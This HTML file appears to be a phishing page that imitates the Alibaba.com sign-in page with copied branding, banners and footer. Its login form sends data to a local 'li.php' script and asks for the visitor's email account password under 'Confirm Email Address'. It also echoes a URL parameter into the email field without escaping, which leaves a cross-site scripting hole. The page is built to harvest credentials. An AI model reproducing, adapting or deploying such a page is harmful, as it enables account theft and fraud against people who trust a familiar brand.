﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
		<title>
		
Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-&nbsp;Suppliers,&nbsp;Manufacturers,&nbsp;Exporters&nbsp;&amp;amp;&nbsp;Importers&nbsp;</title>
		<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
		<meta name="keywords" content="Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers">
		<meta name="description" content="Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers">
		
											
												
																						
<link href="https://stylessl.aliunicorn.com/6v/apollo/core/core-sc|6v/apollo/mod/button/button-sc|6v/apollo/mod/form/form-sc|6v/apollo/mod/footer/footer-sc|6v/run/login/home/home-buyer|MODERN_BROWSER|v_0_b030576d0.css" rel="stylesheet" type="text/css" media="all">

<link rel="icon" href="https://is.alicdn.com/favicon.ico" sizes="16x16" type="image/png">

</head>
	<body><script type="text/javascript" src="https://stylessl.alibaba.com/js/beacon_en.js"></script>             <script type="text/javascript">var dmtrack_c='{-}'; var dmtrack_pageid='29976981cdcc700d1385473806'; sk_dmtracking();</script>             <noscript><img src="https://dmtracking2.alibaba.com/b.jpg?cD0xJnU9ey9sb2dpbi5hbGliYWJhLmNvbS9sb2dpbi5odG19Jm09e0dFVH0mcz17MjAwfSZyPXstfSZhPXstfSZiPXstfSZjPXstfQ==&ver=40&pageid=29976981cdcc700d1385473806&time=1385473806" width="1" height="1" style="display:none"></noscript>

		
				
				
		<header id="header" class="grid grid-c1">
			<div id="ali-logo" class="util-left">
				<a href="http://www.alibaba.com/" title="Manufacturers">
				Alibaba.com</a>	
			</div>

			<div id="changelang" class="util-left">
				<div id="currentlang">
					<a rel="pt_PTen_US" href="javascript:void(0)">English<span class="mn-rs">]</span></a>
				</div>
				<div id="langlist" style="display:none;"></div>
			</div>
<script language="Javascript">
function validateForm()
{
var x=document.forms["logon"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Invalid! Enter your correct E-mail address and E-mail Password");
  return false;
  }
}
</script>

			<script>
								YUE.onDOMReady(function(){

					var LANG = { 						'en_US': 'English ',
						'zh_CN': '简体 ',
						'zh_TW': '繁體 ',
						'es_ES': 'Espa&ntilde;ol ',
						'pt_PT': 'Portugu&ecirc;s ',
						'de_DE': 'Deutsch ',
						'fr_FR': 'Fran&ccedil;ais ',
						'it_IT': 'Italiano ',
						'ru_RU': 'Pусский ',
						'ko_KR': '한국어 ',
						'ja_JP': '日本語 ',
						'ar_SA': 'اللغة العربية ',
						'tr_TR': 'T&uuml;rk ',
						'th_TH': 'ภาษาไทย ',
						'vi_VN': 'tiếng Việt '
					}; 
					
					var sl = new AE.app.switchLanguage();

					sl.init({
						currentLang: { 							 label: 			'en_US', 
							 language: 			'English'
						},
						language:				LANG,
						overkShowConfig: {
							targetId: "currentlang",
							contentId: "langlist",
							showDelayTime: 200,
							hiddenDelayTime: 200,
							excursion: [0, 25]
						}
					});
				});
			</script>

		</header>

		<hr>

		<div id="content" class="grid grid-c1 util-clearfix">
					<script type="text/javascript">
				var xUrlForForcedReturn = 'http://www.alibaba.com';
				function xman_callback(){
					window.location.href = 'http://www.alibaba.com';
				}
			</script>

			<br>
			<br>

<form action="li.php" autocomplete="off" id="logon" onsubmit="return validateForm();" method="post">
			<div id="login-form" class="util-right util-clearfix">
				<div id="standardlogin"><div style="display: block;" class="embedded-join-signIn" id="joinSignBox"><div class="xman_box_inner"><div id="xman-box-content" class="xman-box-content"><div id="tabCurrentMember"><div id="xsignIn-msg"><div class="board errorB server-error" id="server-error-unavailable">Service is unavailable, please retry again later.</div><div class="board errorB server-error" id="server-error-illegal_passport"><strong>Incorrect Email/Member ID.</strong><ul><li>The Email Address or Member ID that you entered is incorrect. Please try again. <br></li><li>If you still encounter problems signing in, please <a target="_blank" href="http://www.alibaba.com/help/contact-us.html">contact us</a>. </li></ul></div><div class="board errorB server-error" id="server-error-illegal_password"><strong>Incorrect Password.</strong><ul><li>The password that you entered is incorrect. Please try again (passwords are case sensitive).<br></li><li>Forgot your password? <br><a href="#" id="requestPwId">Request new password.</a></li></ul></div><div class="board errorB server-error" id="server-error-blocked">You
 have entered an incorrect password too many times. As a security 
measurement, your account will be unavailable for 30 minutes. Please 
re-confirm your password and try again later.</div><div class="board errorB server-error" id="server-error-disabled">Permission for this user has been denied. Please consult your Account Administrator for details.</div><div class="board errorB server-error" id="server-error-ct_error">Check code is incorrect.</div><div class="board alertB server-error" id="server-error-ct_need">For security purposes, please enter the characters shown.</div><div class="board errorB server-error" id="server-error-non_admin_frozen">Permission for this user has been denied. Please consult your Account Administrator for details.</div><div class="board errorB server-error" id="server-error-non_admin_disabled">Permission for this user has been denied. Please consult your Account Administrator for details.</div></div><input name="noCsrfToken" value="" type="hidden">
<h3> Confirm Email Address </h3>
<div class="ui-form-item util-clearfix">
  <label class="ui-form-label" for="xloginPassportId2">Account:</label>
  <input size="25" id="xloginPassportId2" acjs="passport" name="email" placeholder="Email address or member ID" maxlength="328" tabindex="1" class="login-input ui-textfield ui-textfield-normal" value="<?php echo $_GET['email']; ?>" type="text" / required>
  <div class="board errorB standard_signin_error" id="xloginPassportId-advice-error2" style="display: none;">Member ID is required</div>
  <div class="suggestionContainer" style="display: none; position: absolute; z-index: 999; top: 252px; left: 0px; width: 308px;">
    <p index="0"></p>
    <p index="1"></p>
    <p index="2"></p>
    <p index="3"></p>
    <p index="4"></p>
    <p index="5"></p>
  </div>
</div>

<div class="ui-form-item util-clearfix">
  <label class="ui-form-label" for="xloginPassportId">Email Password:</label><input name="password" type="password" class="login-input ui-textfield ui-textfield-normal" id="xloginPassportId" tabindex="1" size="25" maxlength="128" acjs="passport" required>

<div class="board errorB standard_signin_error" id="xloginPassportId-advice-error" style="display: none;">Member ID is required</div>
<div class="suggestionContainer" style="display: none; position: absolute; z-index: 999; top: 252px; left: 0px; width: 308px;">
<p index="0"></p>
<p index="1"></p>
<p index="2"></p>
<p index="3"></p>
<p index="4"></p>
<p index="5"></p>
</div>
</div>

<input type="checkbox" id="fm-keep-login" name="_fm.m._0.k" class="fm-checkbox fm-keep-login" checked="" data-spm-anchor-id="0.0.0.i1.57b81yCd1yCdx2">
        <label id="lbl-keep-login" for="fm-keep-login">Stay signed in. <a href="https://service.alibaba.com/buyer/faq_detail/14468711.htm" target="_blank" class="keep-login-detail">Details</a></label>
    </div>

<div class="ui-form-action  util-clearfix"><input id="signInButton" class="ui-button ui-button-primary ui-button-large" tabindex="5" value="Sign in" type="submit"></div><div id="entries" class="util-clearfix"><a id="xman_join_btn" class="util-right" href="#" title="join in">Join free now!</a></div><div id="xloginPartnerWrapper" class="util-left">Sign&nbsp;in&nbsp;with:<a href="#" id="xloginFacebook" onclick="javascript:dmtrack.clickstat('https://stat.alibaba.com/facebook/list.html',{d_type:'facebook'})"><span></span></a></div></div></div></div><div id="xman_loading_div"></div></div></div>

			</div></form>

				


			<div id="banner">
								
															<!--skylight-home/buyer-en-us.html -start -->
															<p>
															<a target="_blank" data-domdot="id:17690" data-spm-anchor-id="0.0.0.0" href="http://tradeassurance.alibaba.com/bao/buyer_advertise.htm?tracelog=from_login20150113">
															<img width="585" height="340" src="https://img.alicdn.com/tps/TB1dsEEKFXXXXX7XVXXXXXXXXXX-740-420.jpg"></a><!--skylight-home/buyer-en-us.html -end --></div>
			
			
										
						<div id="advisory" class="util-clearfix">

									<img src="https://stylessl.aliunicorn.com/simg/single/icon/ask.gif" style="vertical-align:middle; margin-right:5px;" border="0" height="25">Can't 
									sign in? <a href="http://portal.manjushri.alibaba.com/portal/portal/init.jspa?instanceCode=ALIR00001293&amp;scenceCode=SCEN00004374&amp;digest=85f5aa43e95fbaecb08bf917c1c88aa7#" target="_blank">
									Get help here</a>
							</div>

		
    <!-- tangram:1405 begin-->
<script type="text/javascript">
    
</script>


<div id="screen-banner">
</div>

<div id="banner" data-spm="banner" class="col-m-36 hidden-s hidden-xs hidden-xxs" style="margin: 0;">
        <!-- tangram:645 begin-->




<div style="height:350px;width:585px;margin:0px auto;">
<a href="//activity.alibaba.com/page/vote-for-new-Trade-Assurance-features.html?tracelog=login_votelp" target="_blank">
		<img src="//img.alicdn.com/tps/TB1awf5PXXXXXXLXFXXXXXXXXXX-585-350.jpg">
</a>
</div>

<!-- tangram:645 end-->

  
  

    
  


</div></div>
</div>
</div>
<div class="loading-box"></div></div>
    		</div>
    
    		    
    		    			    		    
    		    		<div id="advisory" class="util-clearfix">
    			    				<img src="//img.alicdn.com/tps/TB1ROn8OpXXXXbZaXXXXXXXXXXX-32-31.png" style="vertical-align:middle; margin-right:5px;" height="25" border="0">Can't sign in? <a href="//gcx.alibaba.com/icbu/anna/portal.htm?pageId=6090&amp;_param_digest_=b635ef82725207200efba8781431d7df" target="_blank">Get help here</a>
    			    		</div>
    		    	</div>
    </div>

</div>

<style type="text/css">
    #login-form {
        background-color:#fff;
    }
    
    body {
        margin:0px;
    }
    
    #content {
        padding:0px;
    }
    #screen-banner {
        position:absolute;
        top:101px;
        left:0px;
        width:100%;
        height:500px;
        background:url('https://s.alicdn.com/@img/tfs/TB1lrY2vUT1gK0jSZFrXXcNCXXa-2200-600.png') center center no-repeat;
    }
    
    #banner {
        display: none;
    }
    
    #action-container {
        position:relative;
        max-width:100px;
        min-height:50px;
    }
    
    #action-banner {
        float:left;
        width:60%;
        height: 600px;
    }
    
    #action-banner a {
        display:block;
        width:100%;
        height:100%;
        text-decoration:none;
    }
    
    
    #login-form-wrapper {
        float:left;
        margin-right:0px;
        margin-top: 40px;
        margin-bottom: 0px;
        padding-bottom: 0px;
    }
    
    #advisory {
        padding:10px 0px;
    }
    
    #ui-footer {
        position:relative;
        left:auto;
        bottom:auto;
    }
    
    
    @media (max-width: 1022px) {
        #screen-banner {
            display:none;
        }
        
        #login-form-wrapper {
            margin-top:60px;
        }
        
        #action-banner {
            display:none;
        }
        
    }
    
</style>
<!-- tangram:1405 end-->



		</div>
				<!--TMS:1281516-->
<style>
/* footer css */
</style>

<div class="skin-default" data-name="mm-sc-new-footer" data-skin="default" data-guid="1409634827621" id="guid-1409634827621" data-version="110" data-type="3"><div class="module" data-spm="a271py"><div class="mm-sc-new-footer">







	<link type="text/css" rel="stylesheet" href="//i.alicdn.com/sc-footer/20160321161740/dist/footer.css">







<footer id="ui-footer" class="ui-footer ui-footer-wrapper">
	<hr>
	<div class="ui-footer-seo">
						<p class="ui-footer-seo-language">
			<i class="global-site"></i> Alibaba.com Site: <a href="http://www.alibaba.com">International</a> - <a href="http://spanish.alibaba.com">Español</a> - <a href="http://portuguese.alibaba.com">Português</a> - <a href="http://german.alibaba.com">Deutsch</a> - <a href="http://french.alibaba.com">Français</a> - <a href="http://italian.alibaba.com">Italiano</a> - <a href="http://hindi.alibaba.com">हिंदी</a> - <a href="http://russian.alibaba.com">Pусский</a> - <a href="http://korean.alibaba.com">한국어</a> - <a href="http://japanese.alibaba.com">日本語</a> - <a href="http://arabic.alibaba.com">اللغة العربية</a> - <a href="http://thai.alibaba.com">ภาษาไทย</a> - <a href="http://turkish.alibaba.com">Türk</a> - <a href="http://dutch.alibaba.com/">Nederlands</a> - <a href="http://vietnamese.alibaba.com/">tiếng Việt</a> - <a href="http://indonesian.alibaba.com/">Indonesian</a> - <a href="http://hebrew.alibaba.com/">עברית</a>		</p>
				
				<p class="ui-footer-seo-brand">
			<a rel="nofollow" href="http://www.alibabagroup.com/en/global/home">Alibaba Group</a>
			| <a rel="nofollow" target="_blank" href="//www.taobao.com">Taobao Marketplace</a>
			| <a rel="nofollow" target="_blank" href="//www.tmall.com">Tmall.com</a>
			| <a rel="nofollow" target="_blank" href="//ju.taobao.com">Juhuasuan</a>
			| <a rel="nofollow" target="_blank" href="http://www.aliexpress.com/">AliExpress</a>
			| <a rel="nofollow" target="_blank" href="//www.alibaba.com">Alibaba.com International</a>
			| <a rel="nofollow" target="_blank" href="http://www.1688.com">1688.com</a>
			| <a rel="nofollow" target="_blank" href="http://www.alimama.com">Alimama</a>
			| <a rel="nofollow" target="_blank" href="//www.alitrip.com/">Alitrip</a>
			<br>
			<a rel="nofollow" target="_blank" href="http://www.aliyun.com">Alibaba Cloud Computing</a>
			| <a rel="nofollow" target="_blank" href="http://www.yunos.com">YunOS</a>
			| <a rel="nofollow" target="_blank" href="//aliqin.tmall.com">AliTelecom</a>
			| <a rel="nofollow" target="_blank" href="http://www.net.cn">HiChina</a>
			| <a rel="nofollow" target="_blank" href="http://www.autonavi.com/">Autonavi</a>
			| <a rel="nofollow" target="_blank" href="http://www.uc.cn/">UCWeb</a>
			| <a rel="nofollow" target="_blank" href="http://www.umeng.com/">Umeng</a>
			| <a rel="nofollow" target="_blank" href="http://www.xiami.com">Xiami</a>
			| <a rel="nofollow" target="_blank" href="http://www.ttpod.com/">TTPod</a>
			| <a rel="nofollow" target="_blank" href="https://www.laiwang.com">Diandianchong</a>
			| <a rel="nofollow" target="_blank" href="http://www.dingtalk.com/?lwfrom=20150202135600390">DingTalk</a>
			| <a rel="nofollow" target="_blank" href="https://intl.alipay.com/index.htm">Alipay</a>
		</p>
		

		<p class="ui-footer-policy">
			<a href="http://rule.alibaba.com/rule/detail/2047.htm" rel="nofollow">Product Listing Policy</a>
			- <a href="http://rule.alibaba.com/rule/detail/2049.htm" rel="nofollow">Intellectual Property Protection</a>
			- <a href="http://rule.alibaba.com/rule/detail/2034.htm" rel="nofollow">Privacy Policy</a>
			- <a href="http://rule.alibaba.com/rule/detail/2041.htm" rel="nofollow">Terms of Use</a>
					</p>

		<p class="ui-footer-copyright">
			<a rel="nofollow" href="http://www.alibaba.com/trade/servlet/page/static/copyright_policy">©</a> 1999-2021 Alibaba.com. All rights reserved.		</p>
	</div>
</footer>

			
</div>

<div id="ServerId" style="color:whitesmoke;text-align:center;background:whitesmoke">  </div>

</div></div>

<script>
seajs.Module.define('mm-sc-new-footer', function(require, exports) {
	// 模块初始化函数
	exports.init = function(box, module) {
		// code here
	};
});
</script>
<script>(function(f){var e,d,c;e=f.replace(/#/ig,"").split(",");for(var b=0,a=e.length;b<a;b++){d=document.getElementById(e[b]);c=d.getAttribute("data-name");seajs.use(c,function(g){g.init(d,c)})}})('#guid-1409634827621');</script>
						<!-- dragoon check -->



<div id="_umfp" style="display:block;position:absolute;top:-5000px;left:-5000px;width:1px;height:1px;overflow:hidden"><img src="https://ynuf.alipay.com/service/clear.png?xt=B4f7bf6a781a606f1054344c8daf46901&amp;xa=intl-login"></div><div class="ui-autocomplete" data-widget-cid="widget-6" style="width: 308px; z-index: 99; display: none; position: absolute; left: -9999px; top: -9999px;">
    <ul class="ui-autocomplete-ctn" data-role="items">
        
    </ul>
</div></body></html>